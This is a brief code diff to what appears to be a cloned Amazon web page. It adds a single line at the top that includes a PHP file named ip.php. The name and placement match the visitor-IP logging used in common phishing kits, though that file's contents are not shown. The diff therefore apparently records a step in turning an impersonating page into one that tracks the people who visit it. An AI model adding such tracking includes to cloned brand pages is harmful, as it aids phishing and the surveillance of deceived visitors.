@@ -1,7 +1,4 @@
-
-
-
-
+<?php include 'ip.php'; ?>
 <!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
   <head>
 <script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>
